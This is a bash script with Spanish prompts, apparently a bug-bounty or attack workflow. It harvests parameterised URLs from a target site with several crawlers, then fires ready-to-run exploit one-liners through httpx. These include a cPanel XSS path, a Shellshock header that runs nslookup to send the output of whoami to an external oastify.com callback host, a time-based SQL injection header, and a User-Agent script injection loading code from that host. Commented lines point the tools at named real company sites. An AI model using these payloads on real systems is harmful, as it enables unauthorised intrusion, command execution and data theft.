echo "Ingrese el sitio para extraer los links"
read url

echo "Escanenado el sitio"





clear
echo "Sacando Enlaces con cariddi"
echo $url | cariddi | deduplicate --hide-useless --sort | grep "=" >> urls.txt


clear
echo "Sacando enlaces con gau"
gau $url --subs | deduplicate --hide-useless --sort | grep "=" | grep -v "css" | grep -v "js" | grep -v "jpg" | grep -v "eot" | grep -v "svg" | grep -v "ttf" | grep -v "woff2" | grep -v "woff" | grep -v "png" | grep -v "txt" >> urls.txt


clear
echo "Sacando enlaces con gospider"
gospider -s $url -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source --user-agent web | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a >> urls.txt
#gospider -s https://www.recordedfuture.com -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source --js --subs --user-agent web | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt


clear
echo "Sacando enlaces con hakrawler"
echo $url | hakrawler -subs | deduplicate --hide-useless --sort | grep "=" | grep -v "css" | grep -v "js" | grep -v "jpg" | grep -v "eot" | grep -v "svg" | grep -v "ttf" | grep -v "woff2" | grep -v "woff" | grep -v "png" | grep -v "txt" >> urls.txt

#echo https://www.recordedfuture.com| hakrawler -subs | grep "=" | grep -v "css" | grep -v "js" | grep -v "jpg" | grep -v "eot" | grep -v "svg" | grep -v "ttf" | grep -v "woff2" | grep -v "woff" | grep -v "png" | grep -v "txt" | qsreplace -a

#echo https://www.payoneer.com/pt/ | jsleak -e

clear
echo "Sacando enlaces con waybackurls"
waybackurls $url | deduplicate --hide-useless --sort |  grep "=" >> urls.txt


cat urls.txt | deduplicate --hide-useless --sort | grep -v "css" | grep -v "js" | grep -v "jpg" | grep -v "eot" | grep -v "svg" | grep -v "ttf" | grep -v "woff2" | grep -v "woff" | grep -v "png" | grep -v "txt" > listas.txt



#Exploit CPANEL XSS
subfinder -d example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path 'cpanelwebcall/%3Cimg%20src%3Dx%20onerror%3D%22prompt%281%29%22%3Eaaaaaaaaaaaa' -mc 400
cpanelwebcall/%3Cimg%20src%3Dx%20onerror%3D%22prompt%281%29%22%3Eaaaaaaaaaaaa

#Exploit Shellshock
echo "example.com" | httpx -silent -H "X-Forwarded-For: () { :; }; /usr/bin/nslookup $(whoami).waaigmh1xvrlpbl3sdoxdai1nstjhe53.oastify.com" -rt -timeout 20 -mrt '>13'

#Exploit SQLI Header X-Forwarded-For
echo "example.com" | httpx -silent -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" -rt -timeout 20 -mrt '>13'

echo "example.com" | waybackurls | httpx -H "User-Agent: \"><script src=waaigmh1xvrlpbl3sdoxdai1nstjhe53.oastify.com></script>"